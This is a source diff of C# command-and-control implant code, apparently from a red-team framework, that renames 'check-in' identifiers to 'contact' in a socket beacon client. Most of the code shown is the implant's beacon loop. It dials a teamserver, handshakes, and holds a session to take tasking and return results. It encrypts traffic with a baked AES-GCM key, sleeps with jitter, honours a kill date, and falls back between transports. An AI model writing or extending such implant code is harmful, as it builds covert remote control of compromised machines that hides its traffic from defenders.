@@ -12,7 +12,7 @@ namespace Rod.Implant.Internal;
 // wire both socket clients share (SocketWire). The handshake advertises the
 // live capability that switches the server from the poll exchange to the
 // held session; an older teamserver that does not know it serves the
-// connection as an ordinary poll check-in, so the advertisement is a
+// connection as an ordinary poll contact, so the advertisement is a
 // graceful step up, never a break. The seal is the socket poll client's own:
 // every message rides as AES-256-GCM under the baked per-artifact key with a
 // fresh counter, so a bare socket or pipe leaks no frame bytes in either
@@ -24,9 +24,9 @@ namespace Rod.Implant.Internal;
 /// Builds the socket stream client off the shared setup; the factory the
 /// generated transport selection names for stream-mode socket builds.
 /// </summary>
-internal static class SocketStreamCheckIn
+internal static class SocketStreamContact
 {
-    public static ICheckInClient Create(CheckInSetup setup) => new SocketStreamBeacon(
+    public static IContactClient Create(ContactSetup setup) => new SocketStreamBeacon(
         setup.Egress,
         setup.Enrollment.ImplantId,
         setup.Enrollment.CAs,
@@ -43,7 +43,7 @@ internal static class SocketStreamCheckIn
 }
 
 /// <summary>
-/// Runs the implant's check-in lifecycle over a held socket connection:
+/// Runs the implant's contact lifecycle over a held socket connection:
 /// dial, handshake (the first message), then hold the session -- read
 /// tasking and channel input, write results and channel output -- until the
 /// connection drops, the kill date passes, or the server refuses
@@ -51,7 +51,7 @@ internal static class SocketStreamCheckIn
 /// session survives it server-side, so the next cycle re-handshakes and
 /// continues.
 /// </summary>
-internal sealed class SocketStreamBeacon : ICheckInClient
+internal sealed class SocketStreamBeacon : IContactClient
 {
     /// <summary>
     /// The handshake capability that asks the server for the held live
@@ -60,8 +60,8 @@ internal sealed class SocketStreamBeacon : ICheckInClient
     /// </summary>
     public const string LiveCapability = "channels.live";
 
-    private const string CheckInRequestAad = "rod-checkin-v1";
-    private const string CheckInResponseAad = "rod-checkin-response-v1";
+    private const string ContactRequestAad = "rod-contact-v1";
+    private const string ContactResponseAad = "rod-contact-response-v1";
     private const int CounterBytes = 8;
 
     private readonly EgressEndpoints _egress;
@@ -82,14 +82,14 @@ internal sealed class SocketStreamBeacon : ICheckInClient
     // dedup, staged/channel/inline shapes) over this client's per-run state.
     private readonly BeaconTasking _tasking;
 
-    // The per-artifact check-in seal, the socket poll client's own: present
-    // only when the bake asked for sealed check-ins, and every message this
+    // The per-artifact contact seal, the socket poll client's own: present
+    // only when the bake asked for sealed contacts, and every message this
     // client exchanges then rides as AES-256-GCM ciphertext under it.
     private readonly (byte[] KeyId, byte[] Key)? _seal;
 
-    // The check-in counter, burned on every client message exactly as the
+    // The contact counter, burned on every client message exactly as the
     // poll client burns it on every cycle.
-    private long _checkInCounter;
+    private long _contactCounter;
 
     public SocketStreamBeacon(
         EgressEndpoints egress,
@@ -120,7 +120,7 @@ internal sealed class SocketStreamBeacon : ICheckInClient
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
         _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
-        _seal = transport is { SealsCheckIns: true }
+        _seal = transport is { SealsContacts: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
     }
@@ -139,11 +139,11 @@ internal sealed class SocketStreamBeacon : ICheckInClient
     /// handshake refusal. A dropped connection (transport failure, refused
     /// message) walks the egress entry and reconnects on the jittered
     /// cadence with the same exponential backoff the other clients apply.
-    /// Returns <see cref="CheckInExit.SwitchTransport"/> when the walk's
+    /// Returns <see cref="ContactExit.SwitchTransport"/> when the walk's
     /// current entry is not a socket URL, so the coordinator hands the run
     /// to the client that serves it.
     /// </summary>
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -151,10 +151,10 @@ internal sealed class SocketStreamBeacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             if (!BeaconUrl.IsSocket(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
 
             var cycle = BeaconCycleResult.Dropped;
             try
@@ -177,7 +177,7 @@ internal sealed class SocketStreamBeacon : ICheckInClient
             // Every non-OK handshake status is permanent for this artifact:
             // retrying would not change the answer.
             if (cycle == BeaconCycleResult.Terminal)
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -196,14 +196,14 @@ internal sealed class SocketStreamBeacon : ICheckInClient
             try
             {
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
     // One connection: dial, handshake, then hold the session until the
@@ -459,7 +459,7 @@ internal sealed class SocketStreamBeacon : ICheckInClient
         }
     }
 
-    // One message out: the check-in body's sealed shape -- the framed bytes
+    // One message out: the contact body's sealed shape -- the framed bytes
     // behind a fresh big-endian counter, sealed under the baked key when the
     // bake carries one; the plaintext lab bake sends the frames as-is.
     private async Task SendMessageAsync(
@@ -469,10 +469,10 @@ internal sealed class SocketStreamBeacon : ICheckInClient
         if (_seal is { } seal)
         {
             var plaintext = new byte[CounterBytes + encoded.Length];
-            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
+            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_contactCounter);
             encoded.AsSpan().CopyTo(plaintext.AsSpan(CounterBytes));
             await wire.WriteBodyAsync(
-                EnvelopeWire.SealCheckInBody(plaintext, seal.KeyId, seal.Key, CheckInRequestAad),
+                EnvelopeWire.SealContactBody(plaintext, seal.KeyId, seal.Key, ContactRequestAad),
                 cancellationToken);
             return;
         }
@@ -495,7 +495,7 @@ internal sealed class SocketStreamBeacon : ICheckInClient
             throw new InvalidOperationException("the server closed the socket session");
         if (_seal is { } open)
         {
-            var plaintext = EnvelopeWire.TryOpenCheckInBody(body, open.KeyId, open.Key, CheckInResponseAad)
+            var plaintext = EnvelopeWire.TryOpenContactBody(body, open.KeyId, open.Key, ContactResponseAad)
                 ?? throw new InvalidOperationException("session message did not verify under the baked key");
             return EnvelopeCodec.Parse(plaintext);
         }
